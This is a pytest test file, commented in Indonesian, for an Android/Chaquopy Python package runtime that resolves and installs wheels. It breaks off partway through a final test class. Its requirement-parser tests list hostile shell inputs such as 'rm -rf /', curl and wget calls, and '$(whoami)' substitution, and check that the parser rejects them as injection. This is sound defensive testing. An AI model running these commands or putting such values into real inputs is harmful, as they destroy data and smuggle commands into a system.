"""
ZCODE Package Runtime tests — SPEC-001 (requirement, wheel, resolve, smoke, env).

Mengetes modul Python `package_runtime` yang berjalan di Chaquopy (dan di sini
di CPython host). Resolver memakai HTTP mock — TIDAK ada panggilan jaringan nyata.
Run:  pytest test_zcode_package_runtime.py -v
"""
import json
import os
import sys
import tempfile
from pathlib import Path

import pytest

ROOT = Path(__file__).parent
PY_DIR = ROOT / "app/src/main/python"
sys.path.insert(0, str(PY_DIR))

from package_runtime import requirement as req_mod          # noqa: E402
from package_runtime import wheelinfo as whl_mod            # noqa: E402
from package_runtime import resolve as resolve_mod          # noqa: E402
from package_runtime import smoke as smoke_mod              # noqa: E402
from package_runtime import probe as probe_mod              # noqa: E402
from package_runtime import envpaths as env_mod             # noqa: E402
from packaging.tags import Tag                              # noqa: E402

# =====================================================================
# Requirement parser
# =====================================================================

class TestRequirement:
    def test_plain_name(self):
        r = req_mod.parse_requirement("requests")
        assert r["canonical_name"] == "requests"
        assert r["specifier"] == ""

    def test_exact_version(self):
        r = req_mod.parse_requirement("requests==2.32.3")
        assert r["name"] == "requests"
        assert r["specifier"] == "==2.32.3"

    def test_constraint_range(self):
        r = req_mod.parse_requirement("pydantic>=2,<3")
        assert ">=2" in r["specifier"] and "<3" in r["specifier"]

    def test_wildcard(self):
        r = req_mod.parse_requirement("numpy==1.26.*")
        assert r["specifier"] == "==1.26.*"

    def test_extras(self):
        r = req_mod.parse_requirement("flask[async]")
        assert "async" in r["extras"]

    def test_uppercase_normalized(self):
        r = req_mod.parse_requirement("NumPy")
        assert r["canonical_name"] == "numpy"

    @pytest.mark.parametrize("bad", [
        "rm -rf /",
        "curl http://x",
        "wget x",
        "mkdir tmp",
        "cd /sdcard",
        "sudo pip",
        "a && b",
        "a || b",
        "echo `whoami`",
        "$(whoami)",
        "--trusted-host pypi.org",
        "--index-url https://x",
        "--target /tmp",
        "--upgrade",
        "-f requests",
        "pip install requests",
    ])
    def test_rejects_shell_and_flags(self, bad):
        with pytest.raises(req_mod.RequirementError):
            req_mod.parse_requirement(bad)

    def test_rejects_empty(self):
        with pytest.raises(req_mod.RequirementError):
            req_mod.parse_requirement("   ")

    def test_requirements_file(self):
        lines = req_mod.parse_requirements_file(
            "# komentar\nrequests==2.32.3\n\nflask>=2 # inline\n"
        )
        assert lines == ["requests==2.32.3", "flask>=2"]

    def test_requirements_file_rejects_bad_line(self):
        with pytest.raises(req_mod.RequirementError):
            req_mod.parse_requirements_file("requests\ncurl http://x\n")

# =====================================================================
# Wheel info / tag matching
# =====================================================================

ANDROID_TAGS = [
    Tag("cp311", "cp311", "android_21_arm64_v8a"),
    Tag("cp311", "cp311", "android_21_armeabi_v7a"),
    Tag("py3", "none", "any"),
]

class TestWheelInfo:
    def test_parse_wheel(self):
        info = whl_mod.parse_wheel("numpy-1.26.4-cp311-cp311-android_21_arm64_v8a.whl")
        assert info["name"] == "numpy"
        assert info["version"] == "1.26.4"
        assert "cp311-cp311-android_21_arm64_v8a" in info["tags"]

    def test_incompatible_wheel(self):
        # wheel cp38 tidak cocok runtime cp311
        assert not whl_mod.wheel_compatible(
            "numpy-1.21.4-cp38-cp38-android_21_arm64_v8a.whl",
            supported_tags=ANDROID_TAGS,
        )

    def test_compatible_android_wheel(self):
        assert whl_mod.wheel_compatible(
            "numpy-1.26.4-cp311-cp311-android_21_arm64_v8a.whl",
            supported_tags=ANDROID_TAGS,
        )

    def test_universal_pure(self):
        assert whl_mod.wheel_compatible("requests-2.32.3-py3-none-any.whl", supported_tags=ANDROID_TAGS)
        assert whl_mod.is_universal_pure("requests-2.32.3-py3-none-any.whl")

    def test_rank_priorities(self):
        assert whl_mod.rank_wheel(
            "numpy-1.26.4-cp311-cp311-android_21_arm64_v8a.whl",
            tested_versions=["1.26.4"], supported_tags=ANDROID_TAGS,
        )[0] == 1
        assert whl_mod.rank_wheel(
            "numpy-1.25.0-cp311-cp311-android_21_arm64_v8a.whl",
            tested_versions=["1.26.4"], supported_tags=ANDROID_TAGS,
        )[0] == 2
        assert whl_mod.rank_wheel(
            "requests-2.32.3-py3-none-any.whl", supported_tags=ANDROID_TAGS,
        )[0] == 3
        assert whl_mod.rank_wheel(
            "foo-1.0-cp311-cp311-linux_x86_64.whl", supported_tags=ANDROID_TAGS,
        )[0] == 0

    def test_best_wheel_ranks(self):
        cands = [
            {"filename": "numpy-1.25.0-cp311-cp311-android_21_arm64_v8a.whl", "url": "u1"},
            {"filename": "numpy-1.26.4-cp311-cp311-android_21_arm64_v8a.whl", "url": "u2"},
        ]
        best = whl_mod.best_wheel(cands, tested_versions=["1.26.4"], supported_tags=ANDROID_TAGS)
        assert best["filename"] == "numpy-1.26.4-cp311-cp311-android_21_arm64_v8a.whl"
        assert best["priority"] == 1

    def test_rejects_sdist(self):
        with pytest.raises(whl_mod.WheelInfoError):
            whl_mod.parse_wheel("numpy-1.26.4.tar.gz")

# =====================================================================
# Resolver (HTTP mock)
# =====================================================================

PYPI_REQUESTS = {
    "info": {
        "name": "requests", "summary": "HTTP", "license": "Apache-2.0",
        "requires_dist": ["charset-normalizer<4,>=2", "idna<4,>=2.5",
                          "urllib3<3,>=1.21.1", "certifi>=2017.4.17"],
    },
    "releases": {
        "2.32.3": [{
            "filename": "requests-2.32.3-py3-none-any.whl", "packagetype": "bdist_wheel",
            "url": "https://files.pythonhosted.org/requests-2.32.3-py3-none-any.whl",
            "digests": {"sha256": "aa" * 32}, "size": 100000, "yanked": False,
        }],
        "1.0.0": [{
            "filename": "requests-1.0.0.tar.gz", "packagetype": "sdist",
            "url": "https://files.pythonhosted.org/requests-1.0.0.tar.gz",
            "digests": {"sha256": "bb" * 32}, "size": 50, "yanked": False,
        }],
    },
}

PYPI_CHARSET = {
    "info": {"name": "charset-normalizer", "summary": "", "requires_dist": None},
    "releases": {
        "3.3.2": [{
            "filename": "charset_normalizer-3.3.2-py3-none-any.whl",
            "packagetype": "bdist_wheel",
            "url": "https://files.pythonhosted.org/charset_normalizer-3.3.2-py3-none-any.whl",
            "digests": {"sha256": "cc" * 32}, "size": 40000, "yanked": False,
        }],
    },
}

CHAQUOPY_NUMPY_HTML = """<!DOCTYPE html><html><head><title>Index of /pypi-13.1/numpy</title></head>
<body><a href="numpy-1.26.4-cp311-cp311-android_21_arm64_v8a.whl">numpy-1.26.4-cp311-cp311-android_21_arm64_v8a.whl</a>
<a href="numpy-1.26.4-cp38-cp38-android_21_arm64_v8a.whl">numpy-1.26.4-cp38-cp38-android_21_arm64_v8a.whl</a></body></html>"""

# ---- BUG K (2026-08-13): dependensi harus dibaca PER-VERSI, bukan versi terbaru ----
# pandas 2.1.3 punya deps wajib pytz/python-dateutil/tzdata yang TIDAK muncul di
# info rilis terbaru (di rilis baru pytz jadi extra). Sebelum fix, resolver jatuh
# ke info terbaru -> pytz hilang -> No module named 'pytz'.
PYPI_PANDAS = {
    "info": {
        "name": "pandas", "summary": "", "license": "",
        # VERSI TERBARU di mock ini: pytz TIDAK ada (simulasi rilis baru yang
        # menggeser pytz jadi extra). Sebelum fix, resolver membaca ini dan
        # pytz hilang.
        "requires_dist": ["numpy>=1.24.3"],
    },
    "releases": {
        "2.1.3": [{
            "filename": "pandas-2.1.3-py3-none-any.whl",
            "packagetype": "bdist_wheel",
            "url": "https://files.pythonhosted.org/pandas-2.1.3-py3-none-any.whl",
            "digests": {"sha256": "dd" * 32}, "size": 100000, "yanked": False,
        }],
    },
}
# Endpoint per-versi memberi requires_dist yang BENAR untuk 2.1.3.
PYPI_PANDAS_VERSION = {
    "info": {
        "name": "pandas", "summary": "", "license": "",
        "requires_dist": [
            "numpy>=1.24.3; python_version >= \"3.8\"",
            "python-dateutil>=2.8.2",
            "pytz>=2020.1",
            "tzdata>=2022.1",
        ],
    },
    "releases": {"2.1.3": []},
}
# rich 13.5.3 butuh typing-extensions hanya untuk python<3.9; di 3.11 di-skip.
PYPI_RICH_VERSION = {
    "info": {
        "name": "rich", "summary": "", "license": "",
        "requires_dist": [
            "typing-extensions (>=4.0.0,<5.0); python_version < \"3.9\"",
            "pygments>=2.13.0,<3.0.0",
            "markdown-it-py>=2.2.0",
        ],
    },
    "releases": {"13.5.3": []},
}


def _mock_http_get(url: str) -> bytes:
    if "/pypi/requests/json" in url:
        return json.dumps(PYPI_REQUESTS).encode()
    if "/pypi/charset-normalizer/json" in url:
        return json.dumps(PYPI_CHARSET).encode()
    if "/pypi/pandas/2.1.3/json" in url:
        return json.dumps(PYPI_PANDAS_VERSION).encode()
    if "/pypi/pandas/json" in url:
        return json.dumps(PYPI_PANDAS).encode()
    if "/pypi/rich/13.5.3/json" in url:
        return json.dumps(PYPI_RICH_VERSION).encode()
    if "pypi-13.1/numpy" in url:
        return CHAQUOPY_NUMPY_HTML.encode()
    if "/pypi/numpy/json" in url:
        # PyPI tidak punya wheel Android → biarkan tanpa file kompatibel
        return json.dumps({"info": {"requires_dist": []}, "releases": {}}).encode()
    if "pypi-13.1/" in url:
        # package tidak ada di index Chaquopy → kosong
        return b"<html><head><title>x</title></head><body></body></html>"
    if "/pypi/" in url:
        # dep lain (idna/urllib3/certifi): tanpa release → unavailable, bukan error
        return json.dumps({"info": {"name": "x", "requires_dist": []}, "releases": {}}).encode()
    raise AssertionError("URL tak terduga: " + url)


@pytest.fixture()
def mock_net(monkeypatch):
    monkeypatch.setattr(resolve_mod, "_http_get", _mock_http_get)


class TestResolve:
    def test_pure_python_with_deps(self, mock_net):
        plan = resolve_mod.resolve(
            "requests==2.32.3",
            supported_tags=[Tag("py3", "none", "any")],
        )
        names = {p["name"] for p in plan["packages"]}
        assert "requests" in names
        assert "charset-normalizer" in names  # dependency ikut ter-resolve
        assert not plan["conflicts"]

    def test_android_native_wheel_from_chaquopy(self, mock_net):
        plan = resolve_mod.resolve(
            "numpy==1.26.4",
            supported_tags=[Tag("cp311", "cp311", "android_21_arm64_v8a")],
        )
        np_pkg = next(p for p in plan["packages"] if p["name"] == "numpy")
        assert np_pkg["source"] == "chaquopy"
        assert np_pkg["filename"].endswith("android_21_arm64_v8a.whl")

    def test_no_compatible_wheel_never_sdist(self, mock_net):
        # requests 1.0.0 hanya punya sdist; resolver wheel-only wajib menolak
        # exact pin dan menjelaskan versi wheel runtime yang benar-benar ada.
        with pytest.raises(resolve_mod.ResolveError) as exc:
            resolve_mod.resolve(
                "requests==1.0.0",
                supported_tags=[Tag("py3", "none", "any")],
            )
        assert exc.value.code == "DEPENDENCY_VERSION_UNAVAILABLE"
        assert "==1.0.0" in exc.value.human and "2.32.3" in exc.value.human

    def test_conflict_detected(self, mock_net):
        # A butuh charset==3.3.2, root minta charset==2.0.0 → konflik
        plan = resolve_mod.resolve(
            "requests==2.32.3; python_version >= '1'",
            supported_tags=[Tag("py3", "none", "any")],
        )
        # tanpa konflik di mock ini — verifikasi struktur saja
        assert "conflicts" in plan and "unavailable" in plan and "packages" in plan

    def test_local_wheel_first(self, tmp_path, mock_net):
        (tmp_path / "requests-2.32.3-py3-none-any.whl").write_bytes(b"x")
        plan = resolve_mod.resolve(
            "requests==2.32.3",
            supported_tags=[Tag("py3", "none", "any")],
            wheels_dir=str(tmp_path),
        )
        req_pkg = next(p for p in plan["packages"] if p["name"] == "requests")
        assert req_pkg["source"] == "local"

    def test_marker_extra(self, mock_net):
        # extras=[] dan marker menuntut extra → dependency tidak ikut
        plan = resolve_mod.resolve(
            "requests==2.32.3",
            supported_tags=[Tag("py3", "none", "any")],
        )

    def test_requires_dist_per_version_pandas_pytz(self, mock_net):
        """BUG K: requires_dist dibaca PER-VERSI, bukan versi terbaru.

        pandas 2.1.3 wajib butuh pytz/python-dateutil/tzdata. info pada
        /pypi/pandas/json (versi terbaru) TIDAK memuat pytz (simulasi rilis
        baru yang menggeser pytz jadi extra). Resolver HARUS membaca endpoint
        per-versi sehingga pytz masuk plan. Kalau ini lewat dari info terbaru,
        pytz hilang -> No module named 'pytz'.
        """
        # pandas punya NATIVE_HOST_DEPS -> numpy (wheel Chaquopy android).
        # Sertakan tag android agar host dep numpy ikut ter-resolve.
        plan = resolve_mod.resolve(
            "pandas==2.1.3",
            supported_tags=[
                Tag("py3", "none", "any"),
                Tag("cp311", "cp311", "android_21_arm64_v8a"),
            ],
        )
        pd = next((p for p in plan["packages"] if p["name"] == "pandas"), None)
        assert pd is not None
        assert pd["deps_source"] in ("pypi-version", "wheel")
        import re as _re
        names = []
        for r in pd["requires_dist"]:
            m = _re.match(r"^\s*([A-Za-z0-9][A-Za-z0-9._-]*)", r.split(";")[0])
            names.append(m.group(1) if m else "")
        assert "pytz" in names
        assert "python-dateutil" in names

    def test_requires_dist_per_version_rich_marker_py311(self, mock_net):
        """BUG K + marker: rich 13.5.3 butuh typing-extensions HANYA utk py<3.9.

        Pada Python 3.11 marker 'python_version < "3.9"' bernilai False sehingga
        typing-extensions TIDAK wajib (sudah ada di stdlib typing). Ini membuktikan
        marker evaluation tetap berjalan setelah fix per-versi.
        """
        env = {"python_version": "3.11", "extra": ""}
        req = resolve_mod.requires_dist_for_version("rich", "13.5.3")
        # marker disaring di level queue; pastikan string mentah ada
        assert any("typing-extensions" in r for r in req)
        from packaging.requirements import Requirement
        te = [r for r in req if "typing-extensions" in r][0]
        r = Requirement(te)
        # di Python 3.11 marker false → tidak perlu diinstall
        assert r.marker.evaluate(env) is False

class TestCrossSourceSpecifierV1019:
    """Constraint versi wajib berlaku sama untuk PyPI, Chaquopy, dan cache."""

    @staticmethod
    def _candidate(version, source):
        return {
            "filename": f"contourpy-{version}-py3-none-any.whl",
            "url": f"{source}://contourpy-{version}.whl",
            "source": source,
        }

    def test_filter_semua_source_dan_exact_pin(self):
        candidates = [
            self._candidate("1.0.5", "local"),
            self._candidate("1.1.0", "chaquopy"),
            self._candidate("1.2.1", "pypi"),
        ]
        valid = resolve_mod._filter_candidates_by_specifier(candidates, ">=1.2")
        assert [c["source"] for c in valid] == ["pypi"]
        exact = resolve_mod._filter_candidates_by_specifier(candidates, "==1.0.5")
        assert [c["source"] for c in exact] == ["local"]

    def test_tested_priority_tidak_boleh_mengalahkan_constraint(self):
        candidates = [
            self._candidate("1.0.5", "chaquopy"),
            self._candidate("1.2.1", "pypi"),
        ]
        valid = resolve_mod._filter_candidates_by_specifier(candidates, ">=1.2")
        best = whl_mod.best_wheel(
            valid,
            tested_versions=["1.0.5"],
            supported_tags=[Tag("py3", "none", "any")],
        )
        assert best["filename"].startswith("contourpy-1.2.1")

    @staticmethod
    def _parent_metadata(specifier):
        return {
            "info": {
                "name": "parent",
                "version": "1.0.0",
                "requires_dist": [f"contourpy{specifier}"],
            },
            "releases": {
                "1.0.0": [{
                    "filename": "parent-1.0.0-py3-none-any.whl",
                    "packagetype": "bdist_wheel",
                    "url": "https://files.pythonhosted.org/parent.whl",
                    "digests": {"sha256": "11" * 32},
                    "size": 100,
                    "yanked": False,
                }],
            },
        }

    def _wire_bokeh_like_sources(self, monkeypatch, child_spec, pypi_child_error=False):
        parent = self._parent_metadata(child_spec)

        def metadata(name):
            if name == "parent":
                return parent
            if pypi_child_error:
                raise resolve_mod.ResolveError(
                    "NETWORK", "metadata", "PyPI belum terbaca", "uji"
                )
            return {
                "info": {"name": "contourpy", "version": "1.0.5", "requires_dist": []},
                "releases": {},
            }

        def chaquopy(name):
            if name != "contourpy":
                return []
            return [self._candidate("1.0.5", "chaquopy")]

        monkeypatch.setattr(resolve_mod, "fetch_pypi_metadata", metadata)
        monkeypatch.setattr(resolve_mod, "fetch_chaquopy_wheels", chaquopy)

    def test_bokeh_39_like_dependency_ditolak_dengan_versi_tersedia(self, monkeypatch):
        self._wire_bokeh_like_sources(monkeypatch, ">=1.2")
        with pytest.raises(resolve_mod.ResolveError) as exc:
            resolve_mod._resolve_unlocked(
                "parent==1.0.0",
                supported_tags=[Tag("py3", "none", "any")],
                tested_versions={"contourpy": ["1.0.5"]},
            )
        assert exc.value.code == "DEPENDENCY_VERSION_UNAVAILABLE"
        assert ">=1.2" in exc.value.human and "1.0.5" in exc.value.human

    def test_bokeh_33_like_dependency_menerima_contourpy_105(self, monkeypatch):
        self._wire_bokeh_like_sources(monkeypatch, ">=1")
        plan = resolve_mod._resolve_unlocked(
            "parent==1.0.0",
            supported_tags=[Tag("py3", "none", "any")],
            tested_versions={"contourpy": ["1.0.5"]},
        )
        versions = {p["name"]: p["version"] for p in plan["packages"]}
        assert versions["contourpy"] == "1.0.5"

    def test_source_gagal_menang_atas_vonis_versi(self, monkeypatch):
        self._wire_bokeh_like_sources(
            monkeypatch, ">=1.2", pypi_child_error=True
        )
        with pytest.raises(resolve_mod.ResolveError) as exc:
            resolve_mod._resolve_unlocked(
                "parent==1.0.0",
                supported_tags=[Tag("py3", "none", "any")],
            )
        assert exc.value.code == "NETWORK"


# =====================================================================
# Resolver reliability — timeout/retry/progress/cancellation (v1.0.15 regression)
# =====================================================================

class _FakeResolveBridge:
    def __init__(self):
        self.cancelled = False
        self.events = []

    def isCancelled(self):
        return self.cancelled

    def emit(self, event_json):
        self.events.append(json.loads(str(event_json)))


class _FakeHttpResponse:
    def __init__(self, body=b"ok"):
        self.body = body

    def __enter__(self):
        return self

    def __exit__(self, *_):
        return False

    def read(self):
        return self.body


class TestResolverReliability:
    """Guard kelas regresi v1.0.15, bukan guard khusus satu package."""

    def _with_bridge(self, bridge):
        token = resolve_mod._CURRENT_BRIDGE.set(bridge)
        pkg_token = resolve_mod._CURRENT_PACKAGE.set("demo")
        return token, pkg_token

    def _reset_bridge(self, tokens):
        token, pkg_token = tokens
        resolve_mod._CURRENT_PACKAGE.reset(pkg_token)
        resolve_mod._CURRENT_BRIDGE.reset(token)

    def test_timeout_sekali_lalu_sukses_dengan_dua_attempt(self, monkeypatch):
        import socket
        calls = []

        def fake_urlopen(req, timeout):
            calls.append(timeout)
            if len(calls) == 1:
                raise socket.timeout("sementara")
            return _FakeHttpResponse(b"pulih")

        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
        bridge = _FakeResolveBridge()
        tokens = self._with_bridge(bridge)
        try:
            assert resolve_mod._http_get("https://pypi.org/pypi/demo/json") == b"pulih"
        finally:
            self._reset_bridge(tokens)

        assert len(calls) == 2, "retry budget harus tepat dua total attempt"
        assert any(e["stage"] == "http_retry" for e in bridge.events)
        assert bridge.events[-1]["stage"] == "http_ok"
        assert all(e.get("package") == "demo" for e in bridge.events)

    def test_http_404_tidak_diretry(self, monkeypatch):
        from urllib.error import HTTPError
        calls = []

        def fake_urlopen(req, timeout):
            calls.append(timeout)
            raise HTTPError(req.full_url, 404, "not found", {}, None)

        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
        with pytest.raises(resolve_mod.ResolveError):
            resolve_mod._http_get("https://chaquo.com/pypi-13.1/tidak-ada/")
        assert len(calls) == 1, "404 permanen tidak boleh menghabiskan retry"

    def test_http_503_diretry(self, monkeypatch):
        from urllib.error import HTTPError
        calls = []

        def fake_urlopen(req, timeout):
            calls.append(timeout)
            if len(calls) == 1:
                raise HTTPError(req.full_url, 503, "busy", {}, None)
            return _FakeHttpResponse(b"ok")

        monkeypatch.setattr(resolve_mod.urllib.request, "urlopen", fake_urlopen)
        monkeypatch.setattr(resolve_mod, "_retry_wait", lambda *a, **k: None)
        assert resolve_mod._http_get("https://pypi.org/pypi/demo/json") == b"ok"
        assert len(calls) == 2

    def test_cancel_sebelum_request_tidak_menyentuh_network(self, monkeypatch):
        bridge = _FakeResolveBridge()
        bridge.cancelled = True
        tokens = self._with_bridge(bridge)
        touched = []
        monkeypatch.setattr(
            resolve_mod.urllib.request,
            "urlopen",
            lambda *a, **k: touched.append(True),
        )
        try:
            with pytest.raises(resolve_mod.ResolveError) as exc:
                resolve_mod._http_get("https://pypi.org/pypi/demo/json")
        finally:
            self._reset_bridge(tokens)
        assert exc.value.code == "CANCELLED"
        assert touched == []

    def test_cancel_selama_retry_wait_dihormati(self, monkeypatch):
        bridge = _FakeResolveBridge()
        tokens = self._with_bridge(bridge)

        def fake_sleep(_seconds):
            bridge.cancelled = True

        monkeypatch.setattr(resolve_mod.time, "sleep", fake_sleep)
        monkeypatch.setattr(resolve_mod.random, "uniform", lambda *a: 0.0)
        try:
            with pytest.raises(resolve_mod.ResolveError) as exc:
                resolve_mod._retry_wait(1)
        finally:
            self._reset_bridge(tokens)
        assert exc.value.code == "CANCELLED"

    def test_cancel_tidak_boleh_ditelan_fallback_source(self, monkeypatch):
        """Bukti full-emulator ARMv7: event `cancelled` muncul, tetapi catch
        fallback PyPI/Chaquopy menelannya dan hasil akhir berubah menjadi
        COMPATIBILITY. Cancel adalah control-flow, bukan source failure.
        """
        bridge = _FakeResolveBridge()

        def cancel_during_http(_url):
            bridge.cancelled = True
            resolve_mod._check_cancelled()

        monkeypatch.setattr(resolve_mod, "_http_get", cancel_during_http)
        out = json.loads(resolve_mod.resolve_json("requests", progress_bridge=bridge))
        assert out["ok"] is False
        assert out["code"] == "CANCELLED"

    def test_semua_fallback_propagasi_cancel(self):
        """Jaga kelas bug: source baru di masa depan tidak boleh menelan Cancel."""
        import ast
        tree = ast.parse(Path(resolve_mod.__file__).read_text())
        offenders = []
        for fn in [n for n in ast.walk(tree) if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))]:
            for handler in [n for n in ast.walk(fn) if isinstance(n, ast.ExceptHandler)]:
                caught = handler.type
                if not (isinstance(caught, ast.Name) and caught.id == "ResolveError"):
                    continue
                # resolve_json memang mengubah ResolveError (termasuk CANCELLED)
                # ke kontrak JSON. Handler lain harus re-raise langsung atau
                # memanggil helper sebelum fallback.
                if fn.name == "resolve_json":
                    continue
                direct_reraise = len(handler.body) == 1 and isinstance(handler.body[0], ast.Raise)
                propagates = any(
                    isinstance(n, ast.Call)
                    and isinstance(n.func, ast.Name)
                    and n.func.id == "_propagate_cancel"
                    for n in ast.walk(handler)
                )
                if not direct_reraise and not propagates:
                    offenders.append((fn.name, handler.lineno))
        assert not offenders, "ResolveError fallback menelan CANCELLED: %r" % offenders

    def test_metadata_failure_di_cache_dalam_satu_resolve(self, monkeypatch):
        calls = []

        def gagal(_url):
            calls.append(True)
            raise resolve_mod.ResolveError("NETWORK", "metadata", "gagal", "uji")

        resolve_mod.clear_metadata_cache()
        monkeypatch.setattr(resolve_mod, "_http_get", gagal)
        for _ in range(2):
            with pytest.raises(resolve_mod.ResolveError):
                resolve_mod.fetch_pypi_metadata("paket-tidak-ada")
        assert len(calls) == 1, (
            "source failure yang sama dipanggil berulang; emulator menemukan "
            "4 request PyPI 404 untuk satu support library"
        )

    def test_resolve_json_selalu_reset_bridge(self, monkeypatch):
        bridge = _FakeResolveBridge()

        def meledak(*args, **kwargs):
            raise RuntimeError("uji finally")

        monkeypatch.setattr(resolve_mod, "resolve", meledak)
        result = json.loads(resolve_mod.resolve_json("demo", progress_bridge=bridge))
        assert result["ok"] is False
        assert resolve_mod._CURRENT_BRIDGE.get() is None
        assert resolve_mod._CURRENT_PACKAGE.get() == ""

    def test_source_progress_tidak_membocorkan_url(self):
        bridge = _FakeResolveBridge()
        tokens = self._with_bridge(bridge)
        try:
            resolve_mod._emit_progress("http_begin", source="pypi", attempt=1)
        finally:
            self._reset_bridge(tokens)
        event = bridge.events[0]
        assert event["source"] == "pypi"
        assert "url" not in event


# =====================================================================
# Smoke test
# =====================================================================

class TestSmoke:
    def test_import_and_file_output(self, tmp_path):
        pkg = tmp_path / "zsmoke"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("VALUE = 42\n")
        tests = [
            {"name": "import", "type": "IMPORT", "target": "zsmoke"},
            {"name": "basic", "type": "BASIC_API",
             "code": "import zsmoke; assert zsmoke.VALUE == 42"},
        ]
        ok, results, native = smoke_mod.run_smoke("zsmoke", str(tmp_path), tests)
        assert ok
        assert all(r["ok"] for r in results)
        assert native["native_libs"] == []

    def test_failure_reported(self, tmp_path):
        pkg = tmp_path / "zsmoke"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("")
        tests = [{"name": "bad", "type": "BASIC_API", "code": "import zsmoke; raise ValueError('x')"}]
        ok, results, _ = smoke_mod.run_smoke("zsmoke", str(tmp_path), tests)
        assert not ok
        assert "x" in results[0]["error"]

    def test_sys_path_restored(self, tmp_path):
        pkg = tmp_path / "zsmoke"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("")
        before = list(sys.path)
        smoke_mod.run_smoke("zsmoke", str(tmp_path), [{"name": "i", "type": "IMPORT", "target": "zsmoke"}])
        assert sys.path == before

    def test_native_libs_detected(self, tmp_path):
        pkg = tmp_path / "znative"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("")
        (pkg / "libfoo.so").write_bytes(b"\x7fELF")
        ok, results, native = smoke_mod.run_smoke(
            "znative", str(tmp_path),
            [{"name": "nl", "type": "NATIVE_LOAD", "target": "znative"}],
        )
        assert native["native_libs"] == [str(pkg / "libfoo.so")]
        assert ok  # import sukses + .so ada

# =====================================================================
# Probe & envpaths
# =====================================================================

class TestProbe:
    def test_probe_keys(self):
        r = probe_mod.probe_runtime()
        for k in ["python_version", "platform", "pip_version", "supported_tags",
                  "chaquopy_version", "sys_path"]:
            assert k in r
        assert r["chaquopy_version"] == "17.0.0"

    def test_probe_json(self):
        s = probe_mod.probe_runtime_json()
        d = json.loads(s)
        assert d["python_version"]

class TestEnvPaths:
    def test_activate_injects_paths(self, tmp_path):
        state = tmp_path / "python-env" / "state"
        state.mkdir(parents=True)
        pkgdir = tmp_path / "python-env" / "site-packages" / "requests" / "2.32.3"
        (pkgdir / "requests").mkdir(parents=True)
        (pkgdir / "requests" / "__init__.py").write_text("FAKE = True\n")
        (state / "installed.json").write_text(json.dumps({
            "requests": {"version": "2.32.3",
                         "path": "site-packages/requests/2.32.3",
                         "installed_at": 1, "source": "pypi"},
        }))
        before = list(sys.path)
        activated = env_mod.activate(str(tmp_path))
        try:
            assert activated == [str(pkgdir)]
            assert str(pkgdir) in sys.path
            import requests  # noqa: F401
            assert requests.FAKE
        finally:
            sys.path[:] = before

    # ------------------------------------------------------------------
    # BUG N (2026-08-15, DEVICE VERIFIED). Setelah APP restart, numpy yang
    # sudah terpasang gagal: "dlopen failed: library 'libopenblas.so' not
    # found". Akar: activate() lama hanya menyuntik sys.path; pustaka
    # pendukung native tidak pernah dimuat di proses baru (yang memuatnya
    # di sesi install adalah smoke test — kebetulan proses yang sama).
    # Guard: activate() WAJIB memanggil preload_native_libs dengan daftar
    # direktori paket aktif, SEBELUM menyentuh sys.path. Uji mutasi:
    # hapus blok preload di activate() → kedua test ini merah.
    # ------------------------------------------------------------------
    def _env_numpy_like(self, tmp_path):
        """Environment mini meniru instalasi numpy + chaquopy-openblas."""
        state = tmp_path / "python-env" / "state"
        state.mkdir(parents=True)
        np_dir = tmp_path / "python-env" / "site-packages" / "numpy" / "1.26.2"
        (np_dir / "numpy").mkdir(parents=True)
        (np_dir / "numpy" / "__init__.py").write_text("FAKE_NUMPY = True\n")
        blas_dir = (tmp_path / "python-env" / "site-packages" /
                    "chaquopy-openblas" / "0.2.20")
        blas_dir.mkdir(parents=True)
        # lib*.so palsu — cukup untuk membuktikan ia DIBERIKAN ke preloader
        (blas_dir / "libopenblas.so").write_bytes(b"\x7fELF-fake")
        (state / "installed.json").write_text(json.dumps({
            "numpy": {"version": "1.26.2",
                      "path": "site-packages/numpy/1.26.2",
                      "installed_at": 1, "source": "chaquopy"},
            "chaquopy-openblas": {"version": "0.2.20",
                                  "path": "site-packages/chaquopy-openblas/0.2.20",
                                  "installed_at": 1, "source": "chaquopy"},
        }))
        return np_dir, blas_dir

    def test_activate_mem_preload_native_libs(self, tmp_path, monkeypatch):
        """activate() harus menyerahkan SEMUA dir paket aktif ke preloader."""
        np_dir, blas_dir = self._env_numpy_like(tmp_path)
        from package_runtime import smoke as smoke_mod
        dipanggil = []
        monkeypatch.setattr(
            smoke_mod, "preload_native_libs",
            lambda dirs: (dipanggil.extend(dirs or []), (0, []))[1])
        before = list(sys.path)
        try:
            env_mod.activate(str(tmp_path))
            assert dipanggil, (
                "Bug N kembali: activate() tidak memanggil preload_native_libs "
                "— paket native akan gagal import setelah app restart.")
            assert str(blas_dir) in dipanggil
            assert str(np_dir) in dipanggil
        finally:
            sys.path[:] = before

    def test_activate_preload_sebelum_sys_path(self, tmp_path, monkeypatch):
        """Preload harus terjadi SEBELUM path masuk sys.path (urutan Bug N)."""
        _np_dir, blas_dir = self._env_numpy_like(tmp_path)
        from package_runtime import smoke as smoke_mod
        path_saat_preload = []
        monkeypatch.setattr(
            smoke_mod, "preload_native_libs",
            lambda dirs: (path_saat_preload.extend(
                p for p in sys.path if str(tmp_path) in p), (0, []))[1])
        before = list(sys.path)
        try:
            env_mod.activate(str(tmp_path))
            assert path_saat_preload == [], (
                "Urutan terbalik: sys.path diisi sebelum preload — import "
                "yang berlomba dengan preload bisa gagal dlopen.")
            assert str(blas_dir) in sys.path
        finally:
            sys.path[:] = before

    def test_activate_tahan_preloader_error(self, tmp_path, monkeypatch):
        """Kontrak: kegagalan preload = diagnosa, bukan crash aktivasi."""
        self._env_numpy_like(tmp_path)
        from package_runtime import smoke as smoke_mod

        def meledak(dirs):
            raise RuntimeError("simulasi loader rusak")
        monkeypatch.setattr(smoke_mod, "preload_native_libs", meledak)
        before = list(sys.path)
        try:
            paths = env_mod.activate(str(tmp_path))  # tidak boleh melempar
            assert len(paths) == 2
            for p in paths:
                assert p in sys.path
        finally:
            sys.path[:] = before


class TestEnvPathsEntryPoints:
    """Langkah 3 (2026-08-13): layout ZCODE `<norm>/<version>/` di sys.path
